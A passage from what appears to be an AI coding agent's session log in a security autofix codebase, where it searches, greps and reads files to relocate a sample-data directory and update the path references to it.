'../servers/vulnerability_report/vuln_report_generates'\\n\\nconst DATA_DIR = path.join(__dirname, 'try_now')\\n\\nexport const TRY_NOW_PROJECTS = {\\n  [Projects.JuiceShop]: {\\n    url: 'https://github.com/juice-shop/juice-shop',\\n    reference: '9a0789b5ecb4ee76fe528b1860095e945f6302ac',\\n    repoFile: path.join(DATA_DIR, 'juice-shop/repo.zip'),\\n    reportFiles: {\\n      [Vendors.Checkmarx]: path.join(DATA_DIR, 'juice-shop/checkmarx.json'),\\n      [Vendors.CodeQl]: path.join(DATA_DIR, 'juice-shop/codeql.json'),\\n      [Vendors.Snyk]: path.join(DATA_DIR, 'juice-shop/snyk.json'),\\n      [Vendors.Fortify]: path.join(DATA_DIR, 'juice-shop/fortify.fpr'),\\n      [Vendors.SonarQube]: path.join(DATA_DIR, 'juice-shop/sonarqube.json'),\\n      [Vendors.Semgrep]: path.join(DATA_DIR, 'juice-shop/semgrep.json'),\\n      [Vendors.Opengrep]: path.join(DATA_DIR, 'juice-shop/semgrep.json'),\\n      [Vendors.Datadog]: path.join(DATA_DIR, 'juice-shop/datadog.json'),\\n    },\\n  },\\n  [Projects.Webgoat]: {\\n    url: 'https://github.com/WebGoat/WebGoat',\\n    reference: 'c7a41d1b178d006053293699061e0dfdb4f47b99',\\n    repoFile: path.join(DATA_DIR, 'webgoat/repo.zip'),\\n    reportFiles: {\\n      [Vendors.Checkmarx]: path.join(DATA_DIR, 'webgoat/checkmarx.json'),\\n      [Vendors.CodeQl]: path.join(DATA_DIR, 'webgoat/codeql.json'),\\n      [Vendors.Snyk]: path.join(DATA_DIR, 'webgoat/snyk.json'),\\n      [Vendors.Fortify]: path.join(DATA_DIR, 'webgoat/fortify.fpr'),\\n      [Vendors.SonarQube]: path.join(DATA_DIR, 'webgoat/sonarqube.json'),\\n      [Vendors.Semgrep]: path.join(DATA_DIR, 'webgoat/semgrep.json'),\\n      [Vendors.Opengrep]: path.join(DATA_DIR, 'webgoat/semgrep.json'),\\n      [Vendors.Datadog]: path.join(DATA_DIR, 'webgoat/datadog.json'),\\n    },\\n  },","detailedLines":[{"text":"import path from 'node:path'","lineNumber":1},{"lineNumber":2},{"text":"import {","lineNumber":3},{"text":"  Projects,","lineNumber":4},{"text":"  Vendors,","lineNumber":5},{"text":"} from '../servers/vulnerability_report/vuln_report_generates'","lineNumber":6},{"lineNumber":7},{"text":"const DATA_DIR = path.join(__dirname, 'try_now')","lineNumber":8},{"lineNumber":9},{"text":"export const TRY_NOW_PROJECTS = {","lineNumber":10},{"text":"  [Projects.JuiceShop]: {","lineNumber":11},{"text":"    url: 'https://github.com/juice-shop/juice-shop',","lineNumber":12},{"text":"    reference: '9a0789b5ecb4ee76fe528b1860095e945f6302ac',","lineNumber":13},{"text":"    repoFile: path.join(DATA_DIR, 'juice-shop/repo.zip'),","lineNumber":14},{"text":"    reportFiles: {","lineNumber":15},{"text":"      [Vendors.Checkmarx]: path.join(DATA_DIR, 'juice-shop/checkmarx.json'),","lineNumber":16},{"text":"      [Vendors.CodeQl]: path.join(DATA_DIR, 'juice-shop/codeql.json'),","lineNumber":17},{"text":"      [Vendors.Snyk]: path.join(DATA_DIR, 'juice-shop/snyk.json'),","lineNumber":18},{"text":"      [Vendors.Fortify]: path.join(DATA_DIR, 'juice-shop/fortify.fpr'),","lineNumber":19},{"text":"      [Vendors.SonarQube]: path.join(DATA_DIR, 'juice-shop/sonarqube.json'),","lineNumber":20},{"text":"      [Vendors.Semgrep]: path.join(DATA_DIR, 'juice-shop/semgrep.json'),","lineNumber":21},{"text":"      [Vendors.Opengrep]: path.join(DATA_DIR, 'juice-shop/semgrep.json'),","lineNumber":22},{"text":"      [Vendors.Datadog]: path.join(DATA_DIR, 'juice-shop/datadog.json'),","lineNumber":23},{"text":"    },","lineNumber":24},{"text":"  },","lineNumber":25},{"text":"  [Projects.Webgoat]: {","lineNumber":26},{"text":"    url: 'https://github.com/WebGoat/WebGoat',","lineNumber":27},{"text":"    reference: 'c7a41d1b178d006053293699061e0dfdb4f47b99',","lineNumber":28},{"text":"    repoFile: path.join(DATA_DIR, 'webgoat/repo.zip'),","lineNumber":29},{"text":"    reportFiles: {","lineNumber":30},{"text":"      [Vendors.Checkmarx]: path.join(DATA_DIR, 'webgoat/checkmarx.json'),","lineNumber":31},{"text":"      [Vendors.CodeQl]: path.join(DATA_DIR, 'webgoat/codeql.json'),","lineNumber":32},{"text":"      [Vendors.Snyk]: path.join(DATA_DIR, 'webgoat/snyk.json'),","lineNumber":33},{"text":"      [Vendors.Fortify]: path.join(DATA_DIR, 'webgoat/fortify.fpr'),","lineNumber":34},{"text":"      [Vendors.SonarQube]: path.join(DATA_DIR, 'webgoat/sonarqube.json'),","lineNumber":35},{"text":"      [Vendors.Semgrep]: path.join(DATA_DIR, 'webgoat/semgrep.json'),","lineNumber":36},{"text":"      [Vendors.Opengrep]: path.join(DATA_DIR, 'webgoat/semgrep.json'),","lineNumber":37},{"text":"      [Vendors.Datadog]: path.join(DATA_DIR, 'webgoat/datadog.json'),","lineNumber":38},{"text":"    },","lineNumber":39},{"text":"  },","lineNumber":40},{"text":"  [Projects.Altoroj]: {","lineNumber":41},{"text":"    url: 'https://github.com/HCL-TECH-SOFTWARE/AltoroJ'","lineNumber":42},{"text":",","lineNumber":55},{"text":"}","lineNumber":56}]},"score":0.2817254960536957},{"codeBlock":{"relativeWorkspacePath":"patchino/tests/conftest.py","range":{"startPosition":{"line":180},"endPosition":{"line":213,"column":22}},"contents":"\\n\\n\\n@pytest.fixture\\ndef temp_prompt_dir(tmp_path, sample_prompt_content):\\n    \\"\\"\\"Create a temporary directory with prompt files for testing.\\"\\"\\"\\n    prompt_dir = tmp_path / \\"prompts\\"\\n    prompt_dir.mkdir()\\n\\n    # Standard fix prompt\\n    standard_prompt = (\\n        prompt_dir / \\"csharp_logging_templates_should_be_constant.user.jinja2\\"\\n    )\\n    standard_prompt.write_text(sample_prompt_content)\\n\\n    # FP detection prompt\\n    fp_prompt = (\\n        prompt_dir\\n        / \\"csharp_logging_templates_should_be_constant_detect_false_positive.user.jinja2\\"\\n    )\\n    fp_prompt.write_text(sample_prompt_content)\\n\\n    return str(prompt_dir)","originalContents":"\\n\\n\\n@pytest.fixture\\ndef temp_prompt_dir(tmp_path, sample_prompt_content):\\n    \\"\\"\\"Create a temporary directory with prompt files for testing.\\"\\"\\"\\n    prompt_dir = tmp_path / \\"prompts\\"\\n    prompt_dir.mkdir()\\n\\n    # Standard fix prompt\\n    standard_prompt = (\\n        prompt_dir / \\"csharp_logging_templates_should_be_constant.user.jinja2\\"\\n    )\\n    standard_prompt.write_text(sample_prompt_content)\\n\\n    # FP detection prompt\\n    fp_prompt = (\\n        prompt_dir\\n        / \\"csharp_logging_templates_should_be_constant_detect_false_positive.user.jinja2\\"\\n    )\\n    fp_prompt.write_text(sample_prompt_content)\\n\\n    return str(prompt_dir)","detailedLines":[{"text":"@pytest.fixture","lineNumber":181},{"text":"def temp_prompt_file(tmp_path, sample_prompt_content):","lineNumber":182,"isSignature":true},{"lineNumber":184},{"text":"    prompt_file.write_text(sample_prompt_content)","lineNumber":185},{"text":"    return str(prompt_file)","lineNumber":186,"isSignature":true},{"lineNumber":187},{"lineNumber":188},{"text":"@pytest.fixture","lineNumber":189},{"text":"def temp_prompt_dir(tmp_path, sample_prompt_content):","lineNumber":190,"isSignature":true},{"text":"    \\"\\"\\"Create a temporary directory with prompt files for testing.\\"\\"\\"","lineNumber":191},{"text":"    prompt_dir = tmp_path / \\"prompts\\"","lineNumber":192},{"text":"    prompt_dir.mkdir()","lineNumber":193},{"lineNumber":194},{"text":"    # Standard fix prompt","lineNumber":195},{"text":"    standard_prompt = (","lineNumber":196},{"text":"        prompt_dir / \\"csharp_logging_templates_should_be_constant.user.jinja2\\"","lineNumber":197},{"text":"    )","lineNumber":198},{"text":"    standard_prompt.write_text(sample_prompt_content)","lineNumber":199},{"lineNumber":200},{"text":"    # FP detection prompt","lineNumber":201},{"text":"    fp_prompt = (","lineNumber":202},{"text":"        prompt_dir","lineNumber":203},{"text":"        / \\"csharp_logging_templates_should_be_constant_detect_false_positive.user.jinja2\\"","lineNumber":204},{"text":"    )","lineNumber":205},{"text":"    fp_prompt.write_text(sample_prompt_content)","lineNumber":206},{"lineNumber":207},{"text":"    return str(prompt_dir)","lineNumber":208,"isSignature":true},{"lineNumber":209},{"lineNumber":210},{"text":"@pytest.fixture","lineNumber":211},{"text":"def mock_fetch_run_feedback():","lineNumber":212,"isSignature":true},{"text":"    \\"\\"\\"Mock the fetch_run_feedback function.\\"\\"\\"","lineNumber":213},{"text":"    return MagicMock()","lineNumber":214,"isSignature":true}]},"score":0.2698521614074707},{"codeBlock":{"relativeWorkspacePath":"pycommon/tests/conftest.py","range":{"startPosition":{},"endPosition":{"line":73}},"contents":"import os\\nimport pathlib\\n\\nimport pytest\\nfrom aioresponses import aioresponses\\n\\nROOT_REPO_DIR = pathlib.Path(__file__).parent.parent.parent\\nWEBGOAT_CHECKMARX_TEST_REPORT_PATH = (\\n    ROOT_REPO_DIR\\n    / \\"services/node_general_backend/src/maintenance/try_now/webgoat/checkmarx.json\\"\\n)\\nWEBGOAT_CHECKMARX_TEST_REPO_ZIP_PATH = (\\n    ROOT_REPO_DIR\\n    / \\"services/node_general_backend/src/maintenance/try_now/webgoat/repo.zip\\"\\n)\\nJUICE_SHOP_SNYK_TEST_REPORT_PATH = (\\n    ROOT_REPO_DIR\\n    / \\"services/node_general_backend/src/maintenance/try_now/juice-shop/snyk.json\\"\\n)\\nJUICE_SHOP_SNYK_TEST_REPO_ZIP_PATH = (\\n    ROOT_REPO_DIR\\n    / \\"services/node_general_backend/src/maintenance/try_now/juice-shop/repo.zip\\"\\n)\\nTESTS_DIR = pathlib.Path(__file__).parent\\n\\nTEST_DATA_SOURCE = TESTS_DIR.parent.parent / \\"__tests__/files\\"\\nTEST_DATA_WEBGOAT = TEST_DATA_SOURCE / \\"webgoat\\"\\nREPO1_CODE_ZIP_PATH = TEST_DATA_SOURCE / \\"repo.zip\\"\\nREPO1_VUL_REPORT = TEST_DATA_SOURCE / \\"altoroj.json\\"\\nREPO1_VUL_REPORT_SONAR = TEST_DATA_SOURCE / \\"altoroj/sonarqube.json\\"\\nREPO1_ORIGINAL_URL = \\"https://github.com/HCL-TECH-SOFTWARE/AltoroJ\\"\\nASSETS_DIR = TESTS_DIR / \\"assets\\"\\nBUGSY_SOURCE = TESTS_DIR.parent.parent / \\"clients/cli\\"\\n\\nSAMPLE_JAVA_FILE = TESTS_DIR / \\"assets/sample.java\\"\\nSAMPLE_JSP_FILE = TESTS_DIR / \\"assets/sample.jsp\\"\\n\\n\\n@pytest.fixture\\ndef aiohttp_session():\\n    with aioresponses() as session:\\n        yield session","originalContents":"import os\\nimport pathlib\\n\\nimport pytest\\nfrom aioresponses import aioresponses\\n\\nROOT_REPO_DIR = pathlib.Path(__file__).parent.parent.parent\\nWEBGOAT_CHECKMARX_TEST_REPORT_PATH = (\\n    ROOT_REPO_DIR\\n    / \\"services/node_general_backend/src/maintenance/try_now/webgoat/checkmarx.json\\"\\n)\\nWEBGOAT_CHECKMARX_TEST_REPO_ZIP_PATH = (\\n    ROOT_REPO_DIR\\n    / \\"services/node_general_backend/src/maintenance/try_now/webgoat/repo.zip\\"\\n)\\nJUICE_SHOP_SNYK_TEST_REPORT_PATH = (\\n    ROOT_REPO_DIR\\n    / \\"services/node_general_backend/src/maintenance/try_now/juice-shop/snyk.json\\"\\n)\\nJUICE_SHOP_SNYK_TEST_REPO_ZIP_PATH = (\\n    ROOT_REPO_DIR\\n    / \\"services/node_general_backend/src/maintenance/try_now/juice-shop/repo.zip\\"\\n)\\nTESTS_DIR = pathlib.Path(__file__).parent\\n\\nTEST_DATA_SOURCE = TESTS_DIR.parent.parent / \\"__tests__/files\\"\\nTEST_DATA_WEBGOAT = TEST_DATA_SOURCE / \\"webgoat\\"\\nREPO1_CODE_ZIP_PATH = TEST_DATA_SOURCE / \\"repo.zip\\"\\nREPO1_VUL_REPORT = TEST_DATA_SOURCE / \\"altoroj.json\\"\\nREPO1_VUL_REPORT_SONAR = TEST_DATA_SOURCE / \\"altoroj/sonarqube.json\\"\\nREPO1_ORIGINAL_URL = \\"https://github.com/HCL-TECH-SOFTWARE/AltoroJ\\"\\nASSETS_DIR = TESTS_DIR / \\"assets\\"\\nBUGSY_SOURCE = TESTS_DIR.parent.parent / \\"clients/cli\\"\\n\\nSAMPLE_JAVA_FILE = TESTS_DIR / \\"assets/sample.java\\"\\nSAMPLE_JSP_FILE = TESTS_DIR / \\"assets/sample.jsp\\"\\n\\n\\n@pytest.fixture\\ndef aiohttp_session():\\n    with aioresponses() as session:\\n        yield session","detailedLines":[{"text":"import os","lineNumber":1},{"text":"import pathlib","lineNumber":2},{"lineNumber":3},{"text":"import pytest","lineNumber":4},{"text":"from aioresponses import aioresponses","lineNumber":5},{"lineNumber":6},{"text":"ROOT_REPO_DIR = pathlib.Path(__file__).parent.parent.parent","lineNumber":7},{"text":"WEBGOAT_CHECKMARX_TEST_REPORT_PATH = (","lineNumber":8},{"text":"    ROOT_REPO_DIR","lineNumber":9},{"text":"    / \\"services/node_general_backend/src/maintenance/try_now/webgoat/checkmarx.json\\"","lineNumber":10},{"text":")","lineNumber":11},{"text":"WEBGOAT_CHECKMARX_TEST_REPO_ZIP_PATH = (","lineNumber":12},{"text":"    ROOT_REPO_DIR","lineNumber":13},{"text":"    / \\"services/node_general_backend/src/maintenance/try_now/webgoat/repo.zip\\"","lineNumber":14},{"text":")","lineNumber":15},{"text":"JUICE_SHOP_SNYK_TEST_REPORT_PATH = (","lineNumber":16},{"text":"    ROOT_REPO_DIR","lineNumber":17},{"text":"    / \\"services/node_general_backend/src/maintenance/try_now/juice-shop/snyk.json\\"","lineNumber":18},{"text":")","lineNumber":19},{"text":"JUICE_SHOP_SNYK_TEST_REPO_ZIP_PATH = (","lineNumber":20},{"text":"    ROOT_REPO_DIR","lineNumber":21},{"text":"    / \\"services/node_general_backend/src/maintenance/try_now/juice-shop/repo.zip\\"","lineNumber":22},{"text":")","lineNumber":23},{"text":"TESTS_DIR = pathlib.Path(__file__).parent","lineNumber":24},{"lineNumber":25},{"text":"TEST_DATA_SOURCE = TESTS_DIR.parent.parent / \\"__tests__/files\\"","lineNumber":26},{"text":"TEST_DATA_WEBGOAT = TEST_DATA_SOURCE / \\"webgoat\\"","lineNumber":27},{"text":"REPO1_CODE_ZIP_PATH = TEST_DATA_SOURCE / \\"repo.zip\\"","lineNumber":28},{"text":"REPO1_VUL_REPORT = TEST_DATA_SOURCE / \\"altoroj.json\\"","lineNumber":29},{"text":"REPO1_VUL_REPORT_SONAR = TEST_DATA_SOURCE / \\"altoroj/sonarqube.json\\"","lineNumber":30},{"text":"REPO1_ORIGINAL_URL = \\"https://github.com/HCL-TECH-SOFTWARE/AltoroJ\\"","lineNumber":31},{"text":"ASSETS_DIR = TESTS_DIR / \\"assets\\"","lineNumber":32},{"text":"BUGSY_SOURCE = TESTS_DIR.parent.parent / \\"clients/cli\\"","lineNumber":33},{"lineNumber":34},{"text":"SAMPLE_JAVA_FILE = TESTS_DIR / \\"assets/sample.java\\"","lineNumber":35},{"text":"SAMPLE_JSP_FILE = TESTS_DIR / \\"assets/sample.jsp\\"","lineNumber":36},{"lineNumber":37},{"lineNumber":38},{"text":"@pytest.fixture","lineNumber":39},{"text":"def aiohttp_session():","lineNumber":40,"isSignature":true},{"text":"    with aioresponses() as session:","lineNumber":41},{"text":"        yield session","lineNumber":42,"isSignature":true},{"lineNumber":43},{"lineNumber":44},{"text":"@pytest.fixture(autouse=True, scope=\\"session\\")","lineNumber":45},{"text":"def mock_env_values_for_py_common():","lineNumber":46,"isSignature":true},{"text":"    os.environ[\\"AWS_S3_ACCESS_KEY_ID\\"] = \\"DUMMY_AWS_S3_ACCESS_KEY_ID\\"","lineNumber":47}]},"score":0.2692480683326721},{"codeBlock":{"relativeWorkspacePath":"patchino/patchino/sampler.py","range":{"startPosition":{"line":339,"column":9},"endPosition":{"line":465}},"contents":"async def _get_customer_report_samples(config: SamplerConfig) -> list[Sample]:\\n\\n    ...\\n\\n    else:\\n        for issue in customer_issues:\\n            if (\\n                issue.raw_issue_type in config.sast_issue_types\\n                and issue.raw_language in config.sast_issue_languages\\n                and len(samples) <= (config.max_sample_count / 2)\\n            ):\\n                if not issue.fingerprint_hash:\\n                    print(\\n                        f\\"Skipping customer issue {issue.index} because cannot calculate fingerprint hash\\"\\n                    )\\n                    continue\\n\\n                samples.append(\\n                    Sample(\\n                        issue=issue,\\n                        report=report,\\n                        report_path=config.customer_report_path,\\n                        source_archive_path=config.customer_source_archive_path,\\n                        is_public=False,\\n                    )\\n                )\\n\\n    print(f\\"Found {len(samples)} issues from the customer report\\")\\n    return samples","originalContents":"\\n    else:\\n        for issue in customer_issues:\\n            if (\\n                issue.raw_issue_type in config.sast_issue_types\\n                and issue.raw_language in config.sast_issue_languages\\n                and len(samples) <= (config.max_sample_count / 2)\\n            ):\\n                if not issue.fingerprint_hash:\\n                    print(\\n                        f\\"Skipping customer issue {issue.index} because cannot calculate fingerprint hash\\"\\n                    )\\n                    continue\\n\\n                samples.append(\\n                    Sample(\\n                        issue=issue,\\n                        report=report,\\n                        report_path=config.customer_report_path,\\n                        source_archive_path=config.customer_source_archive_path,\\n                        is_public=False,\\n                    )\\n                )\\n\\n    print(f\\"Found {len(samples)} issues from the customer report\\")\\n    return samples","detailedLines":[{"text":"async def _get_customer_report_samples(config: SamplerConfig) -> list[Sample]:","lineNumber":343,"isSignature":true},{"text":"    ","lineNumber":344},{"lineNumber":371},{"text":"                    is_public=False,","lineNumber":372},{"text":"                )","lineNumber":373},{"text":"            )","lineNumber":374},{"text":"    else:","lineNumber":375},{"text":"        for issue in customer_issues:","lineNumber":376},{"text":"            if (","lineNumber":377},{"text":"                issue.raw_issue_type in config.sast_issue_types","lineNumber":378},{"text":"                and issue.raw_language in config.sast_issue_languages","lineNumber":379},{"text":"                and len(samples) <= (config.max_sample_count / 2)","lineNumber":380},{"text":"            ):","lineNumber":381},{"text":"                if not issue.fingerprint_hash:","lineNumber":382},{"text":"                    print(","lineNumber":383},{"text":"                        f\\"Skipping customer issue {issue.index} because cannot calculate fingerprint hash\\"","lineNumber":384},{"text":"                    )","lineNumber":385},{"text":"                    continue","lineNumber":386},{"lineNumber":387},{"text":"                samples.append(","lineNumber":388},{"text":"                    Sample(","lineNumber":389},{"text":"                        issue=issue,","lineNumber":390},{"text":"                        report=report,","lineNumber":391},{"text":"                        report_path=config.customer_report_path,","lineNumber":392},{"text":"                        source_archive_path=config.customer_source_archive_path,","lineNumber":393},{"text":"                        is_public=False,","lineNumber":394},{"text":"                    )","lineNumber":395},{"text":"                )","lineNumber":396},{"lineNumber":397},{"text":"    print(f\\"Found {len(samples)} issues from the customer report\\")","lineNumber":398},{"text":"    return samples","lineNumber":399,"isSignature":true},{"lineNumber":400},{"lineNumber":401},{"text":"async def _get_dataset_samples(config: SamplerConfig) -> list[Sample]:","lineNumber":402,"isSignature":true},{"text":"    samples = []","lineNumber":403}]},"score":0.2687819004058838}]}",
        },
        "type": "TOOL_EXECUTION",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T16:48:10.514Z,
        "text": "Checking references to the \`_samples\` directory path that need updating:
",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": undefined,
        "type": "AI_RESPONSE",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T16:48:10.656Z,
        "text": "",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": {
          "accepted": false,
          "name": "grep",
          "parameters": "{"pattern":"_samples","outputMode":"content","caseInsensitive":false}",
          "rawArguments": "{"pattern": "_samples"}",
          "result": "{"success":{"pattern":"_samples","path":".","outputMode":"content","workspaceResults":{"/Users/jonathanafek/src/autofixer":{"content":{"matches":[{"file":"./patchino/patchino/issue_processor.py","matches":[{"lineNumber":238,"content":"        config_path = str(SCRIPT_PATH / \\"../_samples/samples.json\\")"}]},{"file":"./patchino/patchino/sampler.py","matches":[{"lineNumber":221,"content":"    output_dir_path: str = str(SCRIPT_PATH / \\"../_samples\\")"},{"lineNumber":254,"content":"    samples += await _get_customer_report_samples(input_config)"},{"lineNumber":255,"content":"    samples += await _get_dataset_samples(input_config)"},{"lineNumber":275,"content":"    serialized_samples = []"},{"lineNumber":294,"content":"        serialized_samples.append("},{"lineNumber":335,"content":"                \\"issues\\": serialized_samples,"},{"lineNumber":343,"content":"async def _get_customer_report_samples(config: SamplerConfig) -> list[Sample]:"},{"lineNumber":402,"content":"async def _get_dataset_samples(config: SamplerConfig) -> list[Sample]:"}]},{"file":"./consumers/analyzer/tests/assets/python/improper_string_formatting/from_dataset/PennyLaneAI/sonarqube_report.json","matches":[{"lineNumber":15899,"content":"      \\"message\\": \\"Return a value of type \\\\\\"list[TensorLike]\\\\\\" instead of \\\\\\"tuple\\\\\\" or update function \\\\\\"measure_with_samples\\\\\\" type hint.\\","},{"lineNumber":138238,"content":"              \\"msg\\": \\"Change this argument; Function \\\\\\"process_samples\\\\\\" expects a different type\\""},{"lineNumber":138254,"content":"      \\"message\\": \\"Change this argument; Function \\\\\\"process_samples\\\\\\" expects a different type\\","}]},{"file":"./consumers/analyzer/tests/assets/java/hardcoded_secrets/from_dataset/pytorch_vision/checkmarx_report.json","matches":[{"lineNumber":24355,"content":"            \\"name\\": \\"num_processed_samples\\","},{"lineNumber":24362,"content":"            \\"fullName\\": \\"CxPYNS_d684fd43.evaluate.num_processed_samples\\","},{"lineNumber":24370,"content":"            \\"name\\": \\"num_processed_samples\\","},{"lineNumber":24377,"content":"            \\"fullName\\": \\"CxPYNS_d684fd43.evaluate.num_processed_samples\\","},{"lineNumber":24400,"content":"            \\"name\\": \\"num_processed_samples\\","},{"lineNumber":24407,"content":"            \\"fullName\\": \\"CxPYNS_d684fd43.evaluate.num_processed_samples\\","},{"lineNumber":24415,"content":"            \\"name\\": \\"num_processed_samples\\","},{"lineNumber":24422,"content":"            \\"fullName\\": \\"CxPYNS_d684fd43.evaluate.num_processed_samples\\","},{"lineNumber":25874,"content":"            \\"name\\": \\"num_processed_samples\\","},{"lineNumber":25881,"content":"            \\"fullName\\": \\"CxPYNS_d684fd43.evaluate.num_processed_samples\\","},{"lineNumber":25889,"content":"            \\"name\\": \\"num_processed_samples\\","},{"lineNumber":25896,"content":"            \\"fullName\\": \\"CxPYNS_d684fd43.evaluate.num_processed_samples\\","},{"lineNumber":25919,"content":"            \\"name\\": \\"num_processed_samples\\","},{"lineNumber":25926,"content":"            \\"fullName\\": \\"CxPYNS_d684fd43.evaluate.num_processed_samples\\","},{"lineNumber":25934,"content":"            \\"name\\": \\"num_processed_samples\\","},{"lineNumber":25941,"content":"            \\"fullName\\": \\"CxPYNS_d684fd43.evaluate.num_processed_samples\\","},{"lineNumber":27126,"content":"            \\"name\\": \\"num_processed_samples\\","},{"lineNumber":27133,"content":"            \\"fullName\\": \\"CxPYNS_622a6e34.evaluate.num_processed_samples\\","},{"lineNumber":27141,"content":"            \\"name\\": \\"num_processed_samples\\","},{"lineNumber":27148,"content":"            \\"fullName\\": \\"CxPYNS_622a6e34.evaluate.num_processed_samples\\","},{"lineNumber":27171,"content":"            \\"name\\": \\"num_processed_samples\\","},{"lineNumber":27178,"content":"            \\"fullName\\": \\"CxPYNS_622a6e34.evaluate.num_processed_samples\\","},{"lineNumber":27186,"content":"            \\"name\\": \\"num_processed_samples\\","},{"lineNumber":27193,"content":"            \\"fullName\\": \\"CxPYNS_622a6e34.evaluate.num_processed_samples\\","},{"lineNumber":37214,"content":"            \\"name\\": \\"num_processed_samples\\","},{"lineNumber":37221,"content":"            \\"fullName\\": \\"CxPYNS_d917f0cc._evaluate.num_processed_samples\\","},{"lineNumber":37229,"content":"            \\"name\\": \\"num_processed_samples\\","},{"lineNumber":37236,"content":"            \\"fullName\\": \\"CxPYNS_d917f0cc._evaluate.num_processed_samples\\","},{"lineNumber":40037,"content":"            \\"name\\": \\"num_processed_samples\\","},{"lineNumber":40044,"content":"            \\"fullName\\": \\"CxPYNS_284fec67._evaluate.num_processed_samples\\","},{"lineNumber":40052,"content":"            \\"name\\": \\"num_processed_samples\\","},{"lineNumber":40059,"content":"            \\"fullName\\": \\"CxPYNS_284fec67._evaluate.num_processed_samples\\","},{"lineNumber":48178,"content":"            \\"name\\": \\"num_processed_samples\\","},{"lineNumber":48185,"content":"            \\"fullName\\": \\"CxPYNS_5dc40809.evaluate.num_processed_samples\\","},{"lineNumber":48193,"content":"            \\"name\\": \\"num_processed_samples\\","},{"lineNumber":48200,"content":"            \\"fullName\\": \\"CxPYNS_5dc40809.evaluate.num_processed_samples\\","},{"lineNumber":48223,"content":"            \\"name\\": \\"num_processed_samples\\","},{"lineNumber":48230,"content":"            \\"fullName\\": \\"CxPYNS_5dc40809.evaluate.num_processed_samples\\","},{"lineNumber":48238,"content":"            \\"name\\": \\"num_processed_samples\\","},{"lineNumber":48245,"content":"            \\"fullName\\": \\"CxPYNS_5dc40809.evaluate.num_processed_samples\\","}]},{"file":"./services/datadog_postgres_agent/postgres/conf.yaml","matches":[{"lineNumber":43,"content":"    query_samples:"},{"lineNumber":49,"content":"      collection_interval: 15  # Every 15 seconds, default: 10, This number cannot be smaller than query_samples configured collection_interval"}]}],"totalLines":54,"totalMatchedLines":54}}}}}",
        },
        "type": "TOOL_EXECUTION",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T16:48:22.869Z,
        "text": "Moving sample files from \`patchino/_samples\` to the repo root and updating references. Checking the code structure first:
",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": undefined,
        "type": "AI_RESPONSE",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T16:48:23.153Z,
        "text": "",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": {
          "accepted": false,
          "name": "read_file",
          "parameters": "{"targetFile":"/Users/jonathanafek/src/autofixer/patchino/patchino/sampler.py","offset":1,"limit":30,"charsLimit":100000}",
          "rawArguments": "{"target_file": "/Users/jonathanafek/src/autofixer/patchino/patchino/sampler.py", "offset": 1, "limit": 30}",
          "result": "{"contents":"from __future__ import annotations\\n\\nfrom typing import Annotated, Optional\\n\\nimport json\\nimport os\\nimport pathlib\\nimport pickle\\nimport random\\nimport tempfile\\nimport time\\nimport zipfile\\nfrom collections import defaultdict\\nfrom dataclasses import dataclass\\n\\nimport fire  # type: ignore[import-untyped]\\nfrom analyzer.highlight_nodes import highlight_nodes_report_for_issues\\nfrom analyzer.locked_alru_cache import locked_alru_cache\\nfrom annotated_types import Len\\nfrom dotenv import load_dotenv\\nfrom pycommon.report import BaseReportStream, get_report_by_file_stream\\nfrom pycommon.report.file_loader import FileLoader\\nfrom pycommon.report.issue import Issue\\nfrom pycommon.s3 import S3Access\\nfrom pydantic import BaseModel\\n\\nSCRIPT_PATH = pathlib.Path(__file__).parent\\nAUTOFIXER_DIR = SCRIPT_PATH.parent.parent.parent\\nDATASET_DATA_FOLDER_PATH = pathlib.Path(\\n    os.getenv(\\"DATASET_DATA_FOLDER_PATH\\", SCRIPT_PATH / \\"../../../dataset/data\\")","numCharactersInRequestedRange":932,"offsetIsBiggerThanNumberOfLinesInFile":false,"totalLinesInFile":503}",
        },
        "type": "TOOL_EXECUTION",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T16:48:23.153Z,
        "text": "",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": {
          "accepted": false,
          "name": "read_file",
          "parameters": "{"targetFile":"/Users/jonathanafek/src/autofixer/patchino/patchino/issue_processor.py","offset":1,"limit":30,"charsLimit":100000}",
          "rawArguments": "{"target_file": "/Users/jonathanafek/src/autofixer/patchino/patchino/issue_processor.py", "offset": 1, "limit": 30}",
          "result": "{"contents":"# Configure the AI adapter to save the prompt metadata for this tool\\n# DO NOT MOVE THIS LINE OF CODE FROM HERE.\\n# The env var should be set as soon as the module gets loaded\\nfrom analyzer.ai_adapter.prompt import PromptCollector\\nfrom analyzer.fix_info import FalsePositiveFixInfo\\n\\nPromptCollector.enable_prompt_collector()\\n\\nfrom typing import Optional\\n\\nimport asyncio\\nimport inspect\\nimport json\\nimport logging\\nimport os\\nimport pickle\\nimport sys\\nfrom datetime import datetime\\nfrom pathlib import Path\\n\\nfrom analyzer.analysis import ANALYZERS, get_fix_info\\nfrom analyzer.code_checker import check_code_valid\\nfrom pycommon.report.fileutils import FileFixType\\nfrom pycommon.report.issue import Issue\\nfrom pycommon.run_task import process_objects_in_parallel\\nfrom pycommon.s3 import S3Access\\n\\nfrom patchino.config import (\\n    AWS_S3_ACCESS_KEY_ID,\\n    AWS_S3_ENDPOINT,","numCharactersInRequestedRange":864,"offsetIsBiggerThanNumberOfLinesInFile":false,"totalLinesInFile":427}",
        },
        "type": "TOOL_EXECUTION",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T16:48:37.192Z,
        "text": "Moving the sample files to the repo root and updating code references. Copying files first:
",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": undefined,
        "type": "AI_RESPONSE",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T16:48:37.404Z,
        "text": "",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": {
          "accepted": false,
          "name": "run_terminal_cmd",
